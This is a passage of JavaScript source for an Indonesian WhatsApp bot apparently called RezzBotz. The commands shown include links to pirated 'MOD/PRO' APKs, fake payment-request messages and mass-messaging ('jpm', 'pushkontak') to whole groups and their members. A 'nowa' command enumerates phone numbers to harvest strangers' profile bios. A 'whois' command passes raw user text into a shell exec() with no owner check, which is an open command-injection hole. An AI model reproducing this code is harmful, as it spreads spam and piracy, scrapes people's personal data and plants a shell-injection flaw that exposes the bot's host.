ewe = `┏━━°❀❬ *MOD APK* ❭❀°━━┓
┃
┃• Minecraft (Original)
┃https://www.mediafire.com/file/4hixmktsfkhky91/Minecraft_v1.16.101.01_Terbaru.zip/file
┃• Geometry Dash (MOD)
┃http://www.mediafire.com/file/thnoi1wpa5ex2wn/Geometry_Dash_%2528MOD%2529.apk/file
┃• KineMaster (PRO)
┃https://www.mediafire.com/download/eshb8rra8eg5xa3
┃• KineMaster Diamond (MOD)
┃https://www.mediafire.com/download/9p8wsnwupnq0lun
┃• KineMaster Ruby (MOD)
┃https://www.mediafire.com/download/6b2wa08cmtsr8x8
┃• Adobe Photoshop (Original)
┃https://www.mediafire.com/download/whfh12tj4zjpedp
┃• Alight Motion (PRO)
┃http://www.mediafire.com/file/tpxj2grwf8imp6i/Alight_Motion_V.3.1.4_%2528Mod%2529_By_bilqis_neha.apk/file
┃• Avee Player (PRO)
┃https://www.mediafire.com/download/5vkde8d1gcyk33y
┃• Pixellab (PRO)
┃https://www.mediafire.com/download/kxj0xyvrkc8w6h0
┃• Inshot (PRO)
┃https://www.mediafire.com/download/7qcmrfdy2o1ynxf
┃• WavePad (PRO)
┃https://www.mediafire.com/download/oif50qb8ltdoe2x
┃• Vimage (PRO)
┃https://www.mediafire.com/download/egjumopr2wl89tl
┃• Zeotropic (PRO)
┃https://www.mediafire.com/download/tw9zwj2km2tjsnh
┃• 90s (PRO)
┃https://www.mediafire.com/download/0y2bba69f6wakuh
╰────`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'biochange':
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'enable') {
settings.autobio = true
reply(`Berhasil Mengubah AutoBio Ke ${q}`)
} else if (q == 'disable') {
settings.autobio = false
reply(`Berhasil Mengubah AutoBio Ke ${q}`)
}
break   
case 'autobio': {
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *RezzBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`click button *enable* to enable autobio\nclick button *disable* to disable autobio`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".biochange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".biochange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'readchange':
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Contoh ${prefix + command} enable/disable`)
if (q === 'enable') {
settings.autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'disable') {
settings.autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
break
   
case 'autoread': {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ''
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "[ *REZZ BOTZZ - MD* ]"
}),
header: proto.Message.InteractiveMessage.Header.create({
title: Styles(`click button *enable* to enable autoread\nclick button *disable* to disable autoread`),
subtitle: "rorr",
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: tumburl } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".readchange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".readchange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'memeindo':
if (!isCreator) return reply(mess.owner)
                reply(mess.search)
                RezzHost.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${apikey}`}, caption: `Done?`}, {quoted: kalgans})
            break
case 'qcimg':
            const { quote } = require('./lib/scrape/quote.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await RezzHost.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/11a0f6b2f39c9a6023b25.jpg')
            const rest = await quote(q, pushname, ppuser)
            reply(mess.wait)
            RezzHost.sendMessage(m.chat, { image: { url: rest.result }, caption: `Done?`}, { quoted: kalgans })
            .catch(console.error)
            break
case 'pesan': case 'buyer': {
if (!isCreator) return reply(`Khusus Owner`)
if (!args || !args[0]) return reply(`🚩 Please enter the message\nExample of Use: ${prefix + command} ${owner} pesan untuknya`)
let ngen = ['|']
if (args[0].includes(ngen)) return reply('Replace Symbol | So spaces')
if (args[0].length > 14) return reply('Extension Number')
if (args[0].length < 7) return reply('Abbreviation Number')
if (args[0].startsWith('0')) return reply('Use format 62')
if (!args[0]) return reply('Masukkan Teks')
let mention = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? (args[0].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let txt = (args.length > 1 ? args.slice(1).join(' ') : '') || ''
let q = m.quoted ? m.quoted : m
let mime = (q.m || q).mimetype || ''
let tujuan = `${txt}`
if (!m.quoted) {
RezzHost.sendText(mention, tujuan)
} else {
RezzHost.sendText(mention, tujuan)
let media = q ? await m.getQuotedObj() : false || m
await RezzHost.copyNForward(mention, media, false).catch(_ => _)
}
let suks = `Mengirim Pesan *${mime ? mime : 'Teks'}*
*_Success ✅_*

Text :
${txt}
`
RezzHost.sendMessage(m.chat, { text: `${suks}`, mentions: [suks] }, { quoted: kalgans })

}
break
case 'brainly':{
if (!text) return reply(`Example: ${prefix + command} siapakah soekarno`)
reply(mess.search)
json = await fetchJson(`https://itzpire.site/search/brainly?query=${text}`)
let p = `*S E A R C H  B R A I N L Y*\n\n`
json.data.map((v, i) => {
p += `*${i+1} Pertanyaan*: ${v.pertanyaan}\n\n`
p += `*Jawaban*: ${v.jawaban[0].text}\n\n`
}).join('\n\n')
p += `${footer}`
RezzHost.sendMessage(m.chat, {
text: p,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 B R A I N L Y`,
body: '',
thumbnailUrl: `https://telegra.ph/file/44a83ccdd83bdc5953149.jpg`,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
         }
         break
  
case 'tambah':{
	if (!text.includes('+')) return reply2(`Gunakan dengan cara ${command} *angka* + *angka*\n\n_Contoh_\n\n${command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one + nilai_two}`)}
            break
        case 'kurang':{
            if (!text.includes('-')) return reply2(`Gunakan dengan cara ${command} *angka* - *angka*\n\n_Contoh_\n\n${command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one - nilai_two}`)}
            break
        case 'kali':{
            if (!text.includes('*')) return reply2(`Gunakan dengan cara ${command} *angka* * *angka*\n\n_Contoh_\n\n${command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one * nilai_two}`)}
            break
case 'sc':
case 'script': {
    function generateReferenceId(length = 11) {
        return crypto.randomBytes(length).toString('hex').toUpperCase().slice(0, length);
    }

    let caption = `Tertarik? hubungi kontak di bawah\n\n*Wwatsapp :*\n${wame}\n\n*Telegram :*\n${tme}\n`;
    const referenceId = generateReferenceId();

    let ngentod = await generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: caption,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: botname,
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...(await prepareWAMessageMedia(
                                { image: { url: `https://telegra.ph/file/a142962496d3c90d7fe1d.jpg` } },
                                { upload: RezzHost.waUploadToServer },
                            )),
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "review_and_pay",
                                "buttonParamsJson": `{
                                    "currency": "IDR",
                                    "payment_configuration": "",
                                    "payment_type": "",
                                    "total_amount": {
                                        "value": 8000000,
                                        "offset": 100
                                    },
                                    "reference_id": "${referenceId}",
                                    "type": "physical-goods",
                                    "order": {
                                        "status": "payment_requested",
                                        "description": "",
                                        "subtotal": {
                                            "value": 5000000,
                                            "offset": 100
                                        },
                                        "tax": {
                                            "value": 661,
                                            "offset": 100
                                        },
                                        "discount": {
                                            "value": 2000000,
                                            "offset": 100
                                        },
                                        "order_type": "ORDER",
                                        "items": [
                                            {
                                                "retailer_id": "7537631592926009",
                                                "product_id": "7538731592926009",
                                                "name": "${ownername}",
                                                "amount": {
                                                    "value": 450510,
                                                    "offset": 1000
                                                },
                                                "quantity": ${totalFitur()}
                                            }
                                        ]
                                    },
                                    "additional_note": "
━──────────────────────━
- Button
- Fitur Multi device 
- Fitur Cpanel
- Fitur Rpg
- No Enc
- Free Apikey
- Free Update SC 1/2 X

- Developer : REREZ HOSTING 📡 
- Whatsap : https://wa.me/6282321559392
- Telegram : https://t.me/rerez_x_hosting
- Fitur Saat Ini ${totalFitur()}
━──────────────────────━",
                                    "native_payment_methods": []
                                }`
                            }],
                        }),
                        contextInfo: {
                            stanzaId: m.key.id,
                            remoteJid: m.isGroup ? m.sender : m.key.remoteJid,
                            participant: m.key.participant || m.sender,
                            fromMe: m.key.fromMe,
                            quotedMessage: m.message,
                        },
                    }),
                },
            },
        },
        {},
    );

   if (!m.isGroup) return RezzHost.relayMessage(ngentod.key.remoteJid, ngentod.message, {
        messageId: ngentod.key.id,
    });
    
   if (m.isGroup) return RezzHost.relayMessage(m.chat, {
        "requestPaymentMessage": {
            amount: {
                value: 30006610,
                offset: 100,
                currencyCode: 'IDR'
            },
            amount1000: 30006610,
            background: null,
            currencyCodeIso4217: 'IDR',
            expiryTimestamp: 1000000,
            noteMessage: {
                extendedTextMessage: {
                    text: `
━────────────────────━
- Button
- Fitur Multi device 
- Fitur Cpanel
- Fitur Rpg
- No Enc
- Free Apikey
- Free Update SC 1/2 X

- Developer : REREZ HOSTING 📡 
- Whatsap : https://wa.me/6282321559392
- Telegram : https://t.me/rerez_x_hosting
- Fitur Saat Ini ${totalFitur()}
━────────────────────━`,
                }
            },
            requestFrom: m.sender
        }
    }, {});
}
break
case 'thanksto': case 'tqto': {
text_done = `
*[ THANKS TO ]*
- ALLAH SWT
- ORANG TUA SAYA
- TEMAN TEMAN SAYA
- PENYEDIA API
- DEVELOPER BOT 
- IKYY OFFC
- DAN SAYA SENDIRI 


*DI LUNCURKAN SECRIPT INI UNTUK MEMPERMUDAH PEKERJAAN PENGGUNA DALAM MELAKUKAN HAL HAL TERTENTU SAYA REREZ HOSTING MENGUCAPKAN TERIMAKASIH BAGI YANG SUDAH MEMANFAATKAN SECRIPT INI*
`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'tanggal': case 'jam': {
text_done = `
*Hari : ${hariini}*
*Tanggal : ${tanggal2}*
*Jam : ${time}*
`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 10000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
// BATAS MAIN MENU



// O W N E R - M E N U

case 'backup':
        {
          if (!isCreator) return reply(mess.owner)
     await reply("Sabar Mas Lagi Backup!!!");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "RezzSession" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r RezzHost.zip ${ls.join(" ")}`);
          await RezzHost.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./RezzHost.zip"),
              mimetype: "application/zip",
              fileName: "RezzHost.zip",
            },
            { quoted: kalgans }
          );
          await execSync("rm -rf RezzHost.zip");
        }
        break
case 'pconly': 
case 'onlypc': {
if (!isCreator && isPrem) return m.reply(mess.prem);
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://telegra.ph/file/14f9a57b17fa5adc7e914.jpg"
let img2 = "https://telegra.ph/file/cbbbd74fa62a832b1a316.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*Hai Kak ${pushname} ${stime}*\n*MY OWNER ${botname}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `
*Haii kak ${pushname} ${stime}*
*KETIK UNTUK MENGAKTIFKAN ${command} DI ${botname}*
` },
nativeFlowMessage: {
buttons: [{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"✅ PC ONLY OFF\",\"id\":\".onlypc-on/off enable\"}`
}
],},},
{
header: {
imageMessage: await image(img2),
hasMediaAttachment: true,
},
body: { text: `
*Haii kak ${pushname} ${stime}*
*KETIK UNTUK MENONAKTIFKAN ${command} DI ${botname}*
` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"❌ PC ONLY ON\",\"id\":\".onlypc-on/off disable\"}`
}
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
case 'onlypc-on/off': {
        if (!isCreator && isPrem) return m.reply(mess.prem);
        if (args[0] == 'enable' || args[0] == 'disable') {
          const status = args[0] == 'enable';
          if (global.opts["pconly"] !== status) {
            global.opts["pconly"] = status;
            m.reply(`Success Change To ${status ? 'ENABLE' : 'DISABLE'}`);
          } else {
            m.reply(`Already ${status ? 'ENABLE' : 'DISABLE'}`);
          }
        } else {
          m.reply(`Status : ${global.opts["pconly"] ? 'ENABLE' : 'DISABLE'}`);
        }
        }
        break;
case 'gconly': 
case 'onlygc': {
if (!isCreator && isPrem) return m.reply(mess.prem);
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://telegra.ph/file/14f9a57b17fa5adc7e914.jpg"
let img2 = "https://telegra.ph/file/cbbbd74fa62a832b1a316.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*Hai Kak ${pushname} ${stime}*\n*MY OWNER ${botname}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `
*Haii kak ${pushname} ${time}*
*KETIK UNTUK MENGAKTIFKAN ${command} DI ${botname}*
` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"✅ GROUP ONLY OFF\",\"id\":\".onlygc-on/off enable\"}`
}
],},},
{
header: {
imageMessage: await image(img2),
hasMediaAttachment: true,
},
body: { text: `
*Haii kak ${pushname} ${time}*
*KETIK UNTUK MENONAKTIFKAN ${command} DI ${botname}*
` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"❌ GROUP ONLY ON\",\"id\":\".onlygc-on/off disable\"}`
}
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
        case 'onlygc-on/off': {
        if (!isCreator && isPrem) return m.reply(mess.prem);
        if (args[0] == 'enable' || args[0] == 'disable') {
          const status = args[0] == 'enable';
          if (global.opts["gconly"] !== status) {
            global.opts["gconly"] = status;
            m.reply(`Success Change To ${status ? 'ENABLE' : 'DISABLE'}`);
          } else {
            m.reply(`Already ${status ? 'ENABLE' : 'DISABLE'}`);
          }
        } else {
          m.reply(`Status : ${global.opts["gconly"] ? 'ENABLE' : 'DISABLE'}`);
        }
        }
        break;
case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'RezzHost.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'getcase': {
const getCase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync("./RezzHost.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
try{
if (!isCreator) return reply('ngapain')
if (!q) return reply(`contoh : ${prefix + command} antilink`)
let nana = await getCase(q)
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: wm, 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idsal,
 newsletterName: wm, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `*[ Case ${q} ]*`+readmore+` ${nana}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Case ${q}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: wm,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://pomf2.lain.la/f/j1mepjm9.jpg" } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "<!> COPY CASE <!>",
"copy_code": `${nana}`
})
}
]
 })
 })
 }
 }
}, {})
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
} catch(err){
console.log(err)
reply(`Case ${q} tidak di temukan`)
}
}
break 
case 'delcase': {
if (!isCreator) return reply(`*Access Denied ❌*\n\n*Owners only*`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./RezzHost.js', q)
reply('*Dellcase Successfully*')
}
break
case 'listcase': {
let { listCase } = require('./lib/scrape/scrapelistCase.js')
reply(listCase())
}
break
case 'cekdrive': {
var result = await nou.drive.info();
let tks = `*Drive Server Info*\n\n *• Total :* ${result.totalGb} GB\n *• Used :* ${result.usedGb} GB (${result.usedPercentage}%)\n *• Free :* ${result.freeGb} GB (${result.freePercentage}%)`
RezzHost.sendMessage(m.chat, {
text: tks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `D R I V E`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'bandwidth': {
if (!isCreator) return reply(mess.owner)
reply(mess.search)
json = await checkBandwidth()
txt = `乂 B A N D W I D T H

   ◦  *Download* : ${json.download}
   ◦  *Upload* : ${json.upload}

${footer}`
reply(txt)
}
break
case 'whois':{
exec(`whois ${text}`, (err, data) => {
if (err) {
console.log(err.message)
reply(`Eror : ${err.message}`);
} else {
reply(`${data}`);
}
});
}
break
case 'totalfitur': {
let pepe = generateWAMessageFromContent(m.from, {
orderMessage: {
itemCount: `${totalFitur()}`,
status: 500,
surface: 999,
message: `${totalFitur()} Features`,
description: '^^',
orderTitle: 'Haloo',
token: '9',
curreyCode: 'IDR',
totalCurrencyCode: '',
totalAmount1000: '1000000',
sellerJid: '6281288031294@s.whatsapp.net',
thumbnail: fs.readFileSync('./media/quoted.jpg')
}
}, { contextInfo: null, quoted: fverif })

RezzHost.relayMessage(m.chat, pepe.message, { messageId: pepe.key.id })
}
break
case 'ssphone': {
if (!q) return reply(`Example ${prefix+command} github.com`)
reply(mess.search)
let krt = await chApi.ssphone(q)
RezzHost.sendImage(m.chat, krt.result, mess.success, kalgans)
}
break
case 'ss': case 'ssweb': {
const scp1 = require('./lib/myfunc') 
if (!q) return reply(`Example ${prefix+command} link`)
reply(mess.search)
let krt = await scp1.ssweb(q)
RezzHost.sendMessage(from,{image:krt.result,caption: mess.success}, {quoted:kalgans})
}
break
case 'save': {
  if (!isCreator) return reply('ha...');
  if (!q) return reply('reply pesan text')
  reply(`wet`)
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let phoneNumber = users.replace(/[^0-9]/g, ''); // Menghapus semua karakter non-angka dari nomor
if (phoneNumber.length === 11 && phoneNumber.startsWith('0')) {
  phoneNumber = '' + phoneNumber.substr(1); // Mengubah awalan '0' menjadi '62'
} else if (phoneNumber.length === 12 && phoneNumber.startsWith('00')) {
  phoneNumber = phoneNumber.substr(2); // Menghapus awalan '00'
} else if (phoneNumber.length === 13 && phoneNumber.startsWith('+')) {
  phoneNumber = phoneNumber.substr(1); // Menghapus awalan '+'
} else if (phoneNumber.length === 10) {
  phoneNumber = '' + phoneNumber; // Menambahkan awalan '62'
}
phoneNumber = '' + phoneNumber;

const uniqueContacts = [phoneNumber]; // Menggunakan nomor yang ditandai sebagai uniqueContacts
 let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${text}\nTEL;type=CELL;type=VOICE;waid=${uniqueContacts}:+${uniqueContacts}\nEND:VCARD`
await RezzHost.sendMessage(m.chat, { contacts: { displayName: `kayyTwelve`, contacts: [{ vcard }] }}, { quoted: kalgans })
let stikernye = fs.readFileSync('./baseikal/src/done.webp')
RezzHost.sendMessage(from, { sticker: stikernye }, { quoted: kalgans })
}
break
case 'myip': {
if (!isCreator) return reply('kusus owner')
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
reply("🔎 My public IP address is: " + ip);
})
})
}
break
case 'pushmember': case 'jpm': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Teksnya Mana Banh?`)
let getGroups = await RezzHost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let piw = groups.map(v => v.id)
reply(`‼️ *Sedang ${command} Ke ${piw.length} Group* , *Mohon Bersabar Jpm Ini Delay 2 Detik/Share*`)
for (let i of piw) {
await sleep(2500)
let txt = `${text}`
RezzHost.sendMessage(i, {
    text: txt,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `© 2024 | ${botname}`,
        body: botname,
        thumbnailUrl: "https://telegra.ph/file/758943712a27689f89323.jpg",
        sourceUrl: "https://wa.me/6282321559392",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
reply(`🌟 *Sukses ${command} Ke ${piw.length} Group*`)
}
break
case 'pushkontak2':{
if (!isCreator) return reply2(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply2(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await RezzHost.groupMetadata(idgc).catch((e) => reply2(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply2(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
RezzHost.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply2(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;
case 'pushkontak':{
if (!isCreator) return reply2(mess.owner)
if (!m.isGroup) return reply2(`di group coy`)
if (!text) return reply2(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply2(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
RezzHost.sendMessage(geek, {text: `${teksnye}`}, {quoted:kalgans})
}
reply2(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case 'nowa': {
if (!isCreator) throw mess.owner;
if (!q) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = q
if (!noteks.includes('x')) return reply('lah?')
reply(mess.search)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await RezzHost.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await RezzHost.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 RezzHost.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc':{
if (!isCreator) return (`Khusus Owner`)
let getGroups = await RezzHost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await RezzHost.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
